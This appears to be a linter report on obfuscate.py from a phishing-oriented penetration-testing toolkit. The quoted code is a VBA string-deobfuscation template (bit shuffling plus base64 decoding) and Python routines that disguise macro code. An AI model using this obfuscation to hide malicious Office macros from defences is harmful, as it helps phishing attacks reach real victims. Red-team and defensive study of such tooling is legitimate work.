234 | |             m = shlLong And &H40000000
235 | |             ' clear 30th and 31st bits
236 | |             shlLong = (shlLong And &H3FFFFFFF) * 2
237 | |             If m <> 0 Then
238 | |                 ' set 31st bit
239 | |                 shlLong = shlLong Or &H80000000
240 | |             End If
241 | |         Next i
242 | |     End If
243 | | End Function
244 | |
245 | | Public Function DeobfuscateDword(ByVal num As Long) As Long
246 | |     Const mask1 As Long = %(mask1)d
247 | |     Const mask2 As Long = %(mask2)d
248 | |     Const d1 = 7
249 | |     Const d2 = 14
250 | |     Dim t As Long, u, out As Long
251 | |     
252 | |     ' Based on bits shuffling scheme devised by D. Knuth:
253 | |     '   (method described in D.Knuth's vol.4a chapter 7.1.3)
254 | |     t = (num Xor shrLong(num, d2)) And mask2
255 | |     u = num Xor t Xor shlLong(t, d2)
256 | |     t = (u Xor shrLong(u, d1)) And mask1
257 | |     out = (u Xor t Xor shlLong(t, d1))
258 | |     DeobfuscateDword = out
259 | |     
260 | | End Function
261 | |
262 | | Public Function %(deobfuscateFunctionName)sHelper(ByRef inputString() As Byte) As String
263 | |     Dim i, fr, dword, raw As Long
264 | |     Dim a As String, b As String, c As String, d As String
265 | |     Dim deobf As String
266 | |     Dim adword() As String
267 | |     Dim a2, b2 As String
268 | |
269 | |     deobf = ""
270 | |
271 | |     For i = 0 To (UBound(inputString) / 4 + 1)
272 | |         fr = i * 4
273 | |         If fr > UBound(inputString) Then
274 | |             Exit For
275 | |         End If
276 | |
277 | |         dword = 0
278 | |         dword = dword Or shlLong(inputString(fr + 3), 24)
279 | |         dword = dword Or shlLong(inputString(fr + 2), 16)
280 | |         dword = dword Or shlLong(inputString(fr + 1), 8)
281 | |         dword = dword Or inputString(fr + 0)
282 | |         
283 | |         raw = DeobfuscateDword(dword)
284 | |         
285 | |         a = Chr(shrLong((raw And &HFF000000), 24))
286 | |         b = Chr(shrLong((raw And 16711680), 16))
287 | |         c = Chr(shrLong((raw And 65280), 8))
288 | |         d = Chr(shrLong((raw And 255), 0))
289 | |         deobf = deobf + d + c + b + a
290 | |     Next i
291 | |
292 | |     %(deobfuscateFunctionName)sHelper = deobf
293 | | End Function
294 | |
295 | | Public Function %(deobfuscateFunctionName)s(inputString As String) As String
296 | |
297 | |     Dim varByte1() As Byte, arrayByte2() As Byte, arrayByte3(255) As Byte
298 | |     Dim arrayLong4(63) As Long, arrayLong5(63) As Long
299 | |     Dim arrayLong6(63) As Long, bigNumber As Long
300 | |     Dim padding As Integer, iter As Long, index As Long, varLong3 As Long
301 | |     Dim deobf As String
302 | |
303 | |     inputString = Replace(inputString, vbCr, vbNullString)
304 | |     inputString = Replace(inputString, vbLf, vbNullString)
305 | |
306 | |     varLong3 = Len(inputString) Mod 4
307 | |     
308 | |     ' Check padding
309 | |     If InStrRev(inputString, "==") Then
310 | |         padding = 2
311 | |     ElseIf InStrRev(inputString, "" + "=") Then
312 | |         padding = 1
313 | |     End If
314 | |
315 | |     ' Generate index arrays
316 | |     For varLong3 = 0 To 255
317 | |         Select Case varLong3
318 | |             Case 65 To 90
319 | |                 arrayByte3(varLong3) = varLong3 - 65
320 | |             Case 97 To 122
321 | |                 arrayByte3(varLong3) = varLong3 - 71
322 | |             Case 48 To 57
323 | |                 arrayByte3(varLong3) = varLong3 + 4
324 | |             Case 43
325 | |                 arrayByte3(varLong3) = 62
326 | |             Case 47
327 | |                 arrayByte3(varLong3) = 63
328 | |         End Select
329 | |     Next varLong3
330 | |
331 | |     ' Generate index translation arrays
332 | |     For varLong3 = 0 To 63
333 | |         arrayLong4(varLong3) = varLong3 * 64
334 | |         arrayLong5(varLong3) = varLong3 * 4096
335 | |         arrayLong6(varLong3) = varLong3 * 262144
336 | |     Next varLong3
337 | |
338 | |     arrayByte2 = StrConv(inputString, vbFromUnicode)
339 | |     ReDim varByte1((((UBound(arrayByte2) + 1) \ 4) * 3) - 1)
340 | |
341 | |     ' Convert big nums to quartets of raw chars
342 | |     For iter = 0 To UBound(arrayByte2) Step 4
343 | |         bigNumber = arrayLong6(arrayByte3(arrayByte2(iter))) + arrayLong5(arrayByte3(arrayByte2(iter + 1))) + arrayLong4(arrayByte3(aΓÇª
344 | |         varLong3 = bigNumber And 16711680
345 | |         varByte1(index) = varLong3 \ 65536
346 | |         varLong3 = bigNumber And 65280
347 | |         varByte1(index + 1) = varLong3 \ 256
348 | |         varByte1(index + 2) = bigNumber And 255
349 | |         index = index + 3
350 | |     Next iter
351 | |
352 | |     deobf = StrConv(varByte1, vbUnicode)
353 | |     If padding Then deobf = Left$(deobf, Len(deobf) - padding)
354 | |     %(deobfuscateFunctionName)s = %(deobfuscateFunctionName)sHelper(StrConv(deobf, vbFromUnicode))
355 | |     %(deobfuscateFunctionName)s = RemoveTrailingChars(%(deobfuscateFunctionName)s, "%(trailingCharacter)c")
356 | | End Function
357 | |
358 | | Function RemoveTrailingChars(str As String, chars As String) As String
359 | |     Dim count As Long
360 | |     Dim parts() As String
361 | |     parts = Split(str, chars)
362 | |     count = UBound(parts, 1)
363 | |     If count <> 0 Then
364 | |         str = Left$(str, Len(str) - count)
365 | |     End If
366 | |     RemoveTrailingChars = str
367 | | End Function
368 | | """ % {
    | |___^
369 |               "mask1": self.OBFUSCATION_PARAMS["mask1"],
370 |               "mask2": self.OBFUSCATION_PARAMS["mask2"],
    |
help: Replace with format specifiers

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:251:1
    |
249 |     Const d2 = 14
250 |     Dim t As Long, u, out As Long
251 |     
    | ^^^^
252 |     ' Based on bits shuffling scheme devised by D. Knuth:
253 |     '   (method described in D.Knuth's vol.4a chapter 7.1.3)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:259:1
    |
257 |     out = (u Xor t Xor shlLong(t, d1))
258 |     DeobfuscateDword = out
259 |     
    | ^^^^
260 | End Function
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:282:1
    |
280 |         dword = dword Or shlLong(inputString(fr + 1), 8)
281 |         dword = dword Or inputString(fr + 0)
282 |         
    | ^^^^^^^^
283 |         raw = DeobfuscateDword(dword)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:284:1
    |
283 |         raw = DeobfuscateDword(dword)
284 |         
    | ^^^^^^^^
285 |         a = Chr(shrLong((raw And &HFF000000), 24))
286 |         b = Chr(shrLong((raw And 16711680), 16))
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:307:1
    |
306 |     varLong3 = Len(inputString) Mod 4
307 |     
    | ^^^^
308 |     ' Check padding
309 |     If InStrRev(inputString, "==") Then
    |
help: Remove whitespace from blank line

W605 [*] Invalid escape sequence: `\ `
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:339:47
    |
338 |     arrayByte2 = StrConv(inputString, vbFromUnicode)
339 |     ReDim varByte1((((UBound(arrayByte2) + 1) \ 4) * 3) - 1)
    |                                               ^^
340 |
341 |     ' Convert big nums to quartets of raw chars
    |
help: Use a raw string literal

W605 [*] Invalid escape sequence: `\ `
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:345:36
    |
343 | ΓÇª     bigNumber = arrayLong6(arrayByte3(arrayByte2(iter))) + arrayLong5(arrayByte3(arrayByte2(iter + 1))) + arrayLong4(arrayByte3(arrΓÇª
344 | ΓÇª     varLong3 = bigNumber And 16711680
345 | ΓÇª     varByte1(index) = varLong3 \ 65536
    |                                  ^^
346 | ΓÇª     varLong3 = bigNumber And 65280
347 | ΓÇª     varByte1(index + 1) = varLong3 \ 256
    |
help: Use a raw string literal

W605 [*] Invalid escape sequence: `\ `
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:347:40
    |
345 |         varByte1(index) = varLong3 \ 65536
346 |         varLong3 = bigNumber And 65280
347 |         varByte1(index + 1) = varLong3 \ 256
    |                                        ^^
348 |         varByte1(index + 2) = bigNumber And 255
349 |         index = index + 3
    |
help: Use a raw string literal

B006 Do not use mutable data structures for argument defaults
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:426:24
    |
424 |         self,
425 |         normalize_only=False,
426 |         reserved_words=[],
    |                        ^^
427 |         garbage_perc=12.0,
428 |         min_var_length=5,
    |
help: Replace with `None`; initialize within function

N806 Variable `deobfuscatorFunction` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:485:13
    |
483 |     def addDeobfuscator(self):
484 |         if not self.deobfuscatorAddedOnce:
485 |             deobfuscatorFunction = self.bitShuffleObfuscator.getDeobfuscatorCode()
    |             ^^^^^^^^^^^^^^^^^^^^
486 |             # deobfuscatorFunction = self.removeIndents(deobfuscatorFunction)
487 |             deobfuscatorFunction = self.removeEmptyLines(deobfuscatorFunction)
    |

N806 Variable `deobfuscatorFunction` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:487:13
    |
485 |             deobfuscatorFunction = self.bitShuffleObfuscator.getDeobfuscatorCode()
486 |             # deobfuscatorFunction = self.removeIndents(deobfuscatorFunction)
487 |             deobfuscatorFunction = self.removeEmptyLines(deobfuscatorFunction)
    |             ^^^^^^^^^^^^^^^^^^^^
488 |             info("Appending bit shuffle string deobfuscation routines.")
489 |             self.output += "\n%s" % deobfuscatorFunction
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:489:28
    |
487 |             deobfuscatorFunction = self.removeEmptyLines(deobfuscatorFunction)
488 |             info("Appending bit shuffle string deobfuscation routines.")
489 |             self.output += "\n%s" % deobfuscatorFunction
    |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
490 |             self.deobfuscatorAddedOnce = True
    |
help: Replace with format specifiers

N806 Variable `newLines` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:500:9
    |
498 |         txt = re.sub(r"\t| {2,}", "", txt, flags=re.I)
499 |         lines = txt.split("\n")
500 |         newLines = []
    |         ^^^^^^^^
501 |         # Have to be this way instead of finditer due to regex wrongly matching line breaks
502 |         for i in range(len(lines)):
    |

N806 Variable `outLine` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:504:13
    |
502 |         for i in range(len(lines)):
503 |             line = lines[i]
504 |             outLine = line
    |             ^^^^^^^
505 |             for m in re.finditer(
506 |                 r"\s*(\+|\-|\/|\*|\=|\\|\,|\>|\<|\<\>|\^)\s*(?!\_)", line, flags=re.I
    |

N806 Variable `outLine` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:510:17
    |
508 |                 if "_" in line[m.span()[1] :]:
509 |                     continue
510 |                 outLine = outLine.replace(m.group(0), m.group(1))
    |                 ^^^^^^^
511 |             newLines.append(outLine)
512 |         txt = "\n".join(newLines)
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:538:17
    |
537 |               dbg(
538 | /                 "\tChecking if comment (%s) is inside of a string: (%s)"
539 | |                 % (m.group(1), lines[i])
    | |________________________________________^
540 |               )
541 |               n = re.search(r"(\"[^\"']*('[^\"]*)\")", lines[i], flags=re.I)
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:553:22
    |
551 |                 else:
552 |                     lines[i] = line.replace(m.group(1), "")
553 |                 info("Found comment: (%s)" % m.group(1))
    |                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
554 |             else:
555 |                 dbg("\tYes it is. (group: (%s))" % n.group(1))
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:555:21
    |
553 |                 info("Found comment: (%s)" % m.group(1))
554 |             else:
555 |                 dbg("\tYes it is. (group: (%s))" % n.group(1))
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
556 |
557 |                 if m.group(1) not in n.group(1) and m.group(1) not in lines[i]:
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:558:26
    |
557 |                 if m.group(1) not in n.group(1) and m.group(1) not in lines[i]:
558 |                     info("Found comment: (%s)" % m.group(1))
    |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
559 |                     lines[i] = line.replace(m.group(1), "")
    |
help: Replace with format specifiers

N806 Variable `funcStart` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:566:9
    |
564 |         pos = 0
565 |         del self.function_boundaries[:]
566 |         funcStart = 0
    |         ^^^^^^^^^
567 |         funcStop = 0
568 |         counter = 0
    |

N806 Variable `funcStop` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:567:9
    |
565 |         del self.function_boundaries[:]
566 |         funcStart = 0
567 |         funcStop = 0
    |         ^^^^^^^^
568 |         counter = 0
    |

F841 Local variable `funcStop` is assigned to but never used
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:567:9
    |
565 |         del self.function_boundaries[:]
566 |         funcStart = 0
567 |         funcStop = 0
    |         ^^^^^^^^
568 |         counter = 0
    |
help: Remove assignment to unused variable `funcStop`

N806 Variable `funcName` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:576:13
    |
574 |                 break
575 |
576 |             funcName = m.group(1)
    |             ^^^^^^^^
577 |             funcStart = m.span()[0] + (len(m.group(0)) - len(m.group(0).lstrip()))
    |

N806 Variable `funcStart` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:577:13
    |
576 |             funcName = m.group(1)
577 |             funcStart = m.span()[0] + (len(m.group(0)) - len(m.group(0).lstrip()))
    |             ^^^^^^^^^
578 |
579 |             if counter > 0:
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:589:21
    |
587 |                 prev = self.function_boundaries[counter - 1]
588 |                 info(
589 |                     "Function boundaries: (%s, from: %d, to: %d)"
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
590 |                     % (prev["funcName"], prev["funcStart"], prev["funcStop"])
591 |                 )
    |
help: Replace with format specifiers

SIM113 Use `enumerate()` for index variable `counter` in `for` loop
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:595:13
    |
593 |             elem = {"funcName": funcName, "funcStart": funcStart, "funcStop": -1}
594 |             self.function_boundaries.append(elem)
595 |             counter += 1
    |             ^^^^^^^^^^^^
596 |
597 |     def isInsideFunc(self, pos, offset=0):
    |

N803 Argument name `lineStart0` should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:609:40
    |
607 |         return None
608 |
609 |     def findLongLines(self, txt, pos0, lineStart0=0, lineStop0=0):
    |                                        ^^^^^^^^^^^^
610 |         rex = ScriptObfuscator.LONG_LINES_REGEX
611 |         pos = pos0
    |

N803 Argument name `lineStop0` should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:609:54
    |
607 |         return None
608 |
609 |     def findLongLines(self, txt, pos0, lineStart0=0, lineStop0=0):
    |                                                      ^^^^^^^^^^^
610 |         rex = ScriptObfuscator.LONG_LINES_REGEX
611 |         pos = pos0
    |

N806 Variable `varName` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:612:9
    |
610 |         rex = ScriptObfuscator.LONG_LINES_REGEX
611 |         pos = pos0
612 |         varName = None
    |         ^^^^^^^
613 |         longLine = None
614 |         origLine = None
    |

N806 Variable `longLine` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:613:9
    |
611 |         pos = pos0
612 |         varName = None
613 |         longLine = None
    |         ^^^^^^^^
614 |         origLine = None
615 |         lineStart = lineStart0
    |

N806 Variable `origLine` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:614:9
    |
612 |         varName = None
613 |         longLine = None
614 |         origLine = None
    |         ^^^^^^^^
615 |         lineStart = lineStart0
616 |         lineStop = lineStop0
    |

N806 Variable `lineStart` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:615:9
    |
613 |         longLine = None
614 |         origLine = None
615 |         lineStart = lineStart0
    |         ^^^^^^^^^
616 |         lineStop = lineStop0
    |

N806 Variable `lineStop` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:616:9
    |
614 |         origLine = None
615 |         lineStart = lineStart0
616 |         lineStop = lineStop0
    |         ^^^^^^^^
617 |
618 |         dbg("Searching for long lines.", bcolors.OKBLUE)
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:620:17
    |
618 |         dbg("Searching for long lines.", bcolors.OKBLUE)
619 |         while pos < len(txt):
620 |             dbg("Searching for long lines regex: POS = %d" % pos, bcolors.OKGREEN)
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
621 |             m = re.search(rex, txt[pos:], flags=re.I | re.M)
622 |             if not m:
    |
help: Replace with format specifiers

N806 Variable `varName` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:625:13
    |
623 |                 break
624 |
625 |             varName = m.group(1)
    |             ^^^^^^^
626 |             longLine = m.group(2)
    |

N806 Variable `longLine` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:626:13
    |
625 |             varName = m.group(1)
626 |             longLine = m.group(2)
    |             ^^^^^^^^
627 |
628 |             endOfLine = pos + txt[pos:].find("\n")
    |

N806 Variable `endOfLine` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:628:13
    |
626 |             longLine = m.group(2)
627 |
628 |             endOfLine = pos + txt[pos:].find("\n")
    |             ^^^^^^^^^
629 |             suffix = txt[pos : endOfLine + 1]
    |

N806 Variable `lineStart` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:631:13
    |
629 |             suffix = txt[pos : endOfLine + 1]
630 |
631 |             lineStart = pos + m.span()[0]
    |             ^^^^^^^^^
632 |
633 |             pos += m.span()[1]
    |

N806 Variable `lineStop` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:635:13
    |
633 |             pos += m.span()[1]
634 |             pos += len(suffix)
635 |             lineStop = pos - 1
    |             ^^^^^^^^
636 |
637 |             dbg(
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:638:17
    |
637 |             dbg(
638 |                 "This is candidate for a long line (pos=%d, lineStart=%d, lineStop=%d, span: %s):\n{{ %s }}\n"
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
639 |                 % (pos, lineStart, lineStop, str(m.span()), longLine)
640 |             )
    |
help: Replace with format specifiers

N806 Variable `endOfLine` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:646:17
    |
644 |                 if pos >= len(txt):
645 |                     break
646 |                 endOfLine = pos + txt[pos:].find("\n")
    |                 ^^^^^^^^^
647 |                 line = txt[pos:endOfLine]
648 |                 dbg(
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:649:21
    |
647 |                 line = txt[pos:endOfLine]
648 |                 dbg(
649 |                     "\tDoes this line contains strings? (pos=%d, end=%d):\n\t{{ %s }}\n"
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
650 |                     % (pos, endOfLine, line)
651 |                 )
    |
help: Replace with format specifiers

N806 Variable `endOfLine` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:655:21
    |
653 |                 if endOfLine < pos:
654 |                     fault = True
655 |                     endOfLine, pos = pos, endOfLine
    |                     ^^^^^^^^^
656 |                     line = txt[pos:]
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:659:21
    |
658 |                 dbg(
659 |                     "\tWe will find out by matching this line: pos=%d, endOfLine=%d,\n{{ %s }}"
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
660 |                     % (pos, endOfLine, line)
661 |                 )
    |
help: Replace with format specifiers

N806 Variable `origLine` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:671:25
    |
669 | ΓÇª     dbg("\tOoops, not matching seemingly.")
670 | ΓÇª     if len(longLine) > SPLIT:
671 | ΓÇª         origLine = txt[lineStart:lineStop]
    |           ^^^^^^^^
672 | ΓÇª         dbg(
673 | ΓÇª             "Although this is helluva long line - %d bytes! Gotta break it up. (lineStart=%d, lineStop=%d, pos=%d):\n{{ %s }}\n"
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:673:29
    |
671 | ΓÇª     origLine = txt[lineStart:lineStop]
672 | ΓÇª     dbg(
673 | ΓÇª         "Although this is helluva long line - %d bytes! Gotta break it up. (lineStart=%d, lineStop=%d, pos=%d):\n{{ %s }}\n"
    |           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
674 | ΓÇª         % (len(longLine), lineStart, lineStop, pos, longLine)
675 | ΓÇª     )
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:679:21
    |
677 |                     break
678 |
679 |                 dbg("\tYes. It matches smoothly: (%s)" % n.group(2))
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
680 |                 longLine += n.group(2)
681 |                 lineStop = endOfLine
    |
help: Replace with format specifiers

N806 Variable `longLine` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:680:17
    |
679 |                 dbg("\tYes. It matches smoothly: (%s)" % n.group(2))
680 |                 longLine += n.group(2)
    |                 ^^^^^^^^
681 |                 lineStop = endOfLine
    |

N806 Variable `lineStop` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:681:17
    |
679 |                 dbg("\tYes. It matches smoothly: (%s)" % n.group(2))
680 |                 longLine += n.group(2)
681 |                 lineStop = endOfLine
    |                 ^^^^^^^^
682 |
683 |             assert lineStart < lineStop
    |

N806 Variable `lineStop` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:684:13
    |
683 |             assert lineStart < lineStop
684 |             lineStop = pos
    |             ^^^^^^^^
685 |
686 |         origLine = txt[lineStart:lineStop]
    |

N806 Variable `origLine` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:686:9
    |
684 |             lineStop = pos
685 |
686 |         origLine = txt[lineStart:lineStop]
    |         ^^^^^^^^
687 |         dbg(
688 |             "Found long line (lineStart=%d, lineStop=%d, pos=%d):\n{{ %s }}\n"
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:688:13
    |
686 |         origLine = txt[lineStart:lineStop]
687 |         dbg(
688 |             "Found long line (lineStart=%d, lineStop=%d, pos=%d):\n{{ %s }}\n"
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
689 |             % (lineStart, lineStop, pos, origLine)
690 |         )
    |
help: Replace with format specifiers

N806 Variable `lineStart` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:696:9
    |
694 |         replaces = []
695 |         pos = 0
696 |         lineStart = 0
    |         ^^^^^^^^^
697 |         lineStop = 0
    |

N806 Variable `lineStop` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:697:9
    |
695 |         pos = 0
696 |         lineStart = 0
697 |         lineStop = 0
    |         ^^^^^^^^
698 |
699 |         while True:
    |

N806 Variable `varName` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:700:14
    |
699 |         while True:
700 |             (varName, origLine, longLine, pos, lineStart, lineStop) = (
    |              ^^^^^^^
701 |                 self.findLongLines(txt, pos, lineStart, lineStop)
702 |             )
    |

N806 Variable `origLine` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:700:23
    |
699 |         while True:
700 |             (varName, origLine, longLine, pos, lineStart, lineStop) = (
    |                       ^^^^^^^^
701 |                 self.findLongLines(txt, pos, lineStart, lineStop)
702 |             )
    |

N806 Variable `longLine` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:700:33
    |
699 |         while True:
700 |             (varName, origLine, longLine, pos, lineStart, lineStop) = (
    |                                 ^^^^^^^^
701 |                 self.findLongLines(txt, pos, lineStart, lineStop)
702 |             )
    |

N806 Variable `lineStart` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:700:48
    |
699 |         while True:
700 |             (varName, origLine, longLine, pos, lineStart, lineStop) = (
    |                                                ^^^^^^^^^
701 |                 self.findLongLines(txt, pos, lineStart, lineStop)
702 |             )
    |

N806 Variable `lineStop` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:700:59
    |
699 |         while True:
700 |             (varName, origLine, longLine, pos, lineStart, lineStop) = (
    |                                                           ^^^^^^^^
701 |                 self.findLongLines(txt, pos, lineStart, lineStop)
702 |             )
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:706:17
    |
704 | ΓÇª     break
705 | ΓÇª dbg(
706 | ΓÇª     "AFTER Searching for acompanying lines. Returned: varName = (%s), pos=%d, lineStart=%d, lineStop = %d\n\torigLine = {{ %s }}\n\tlongLine = {{ %s }}"
    |       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
707 | ΓÇª     % (varName, pos, lineStart, lineStop, origLine, longLine)
708 | ΓÇª )
    |
help: Replace with format specifiers

N806 Variable `newLine` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:709:13
    |
707 |                 % (varName, pos, lineStart, lineStop, origLine, longLine)
708 |             )
709 |             newLine = ""
    |             ^^^^^^^
710 |             for s in range(len(longLine) / SPLIT + 1):
711 |                 fr = s * SPLIT
    |

N806 Variable `newLine` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:714:21
    |
712 |                 to = fr + SPLIT
713 |                 if newLine == "":
714 |                     newLine += '\n%s = "%s"\n' % (varName, longLine[fr:to])
    |                     ^^^^^^^
715 |                 else:
716 |                     newLine += '%s = %s + "%s"\n' % (varName, varName, longLine[fr:to])
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:714:32
    |
712 |                 to = fr + SPLIT
713 |                 if newLine == "":
714 |                     newLine += '\n%s = "%s"\n' % (varName, longLine[fr:to])
    |                                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
715 |                 else:
716 |                     newLine += '%s = %s + "%s"\n' % (varName, varName, longLine[fr:to])
    |
help: Replace with format specifiers

N806 Variable `newLine` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:716:21
    |
714 |                     newLine += '\n%s = "%s"\n' % (varName, longLine[fr:to])
715 |                 else:
716 |                     newLine += '%s = %s + "%s"\n' % (varName, varName, longLine[fr:to])
    |                     ^^^^^^^
717 |
718 |             dbg("Full long line joined altogether:\n{{ %s }}\n" % longLine)
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:716:32
    |
714 |                     newLine += '\n%s = "%s"\n' % (varName, longLine[fr:to])
715 |                 else:
716 |                     newLine += '%s = %s + "%s"\n' % (varName, varName, longLine[fr:to])
    |                                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
717 |
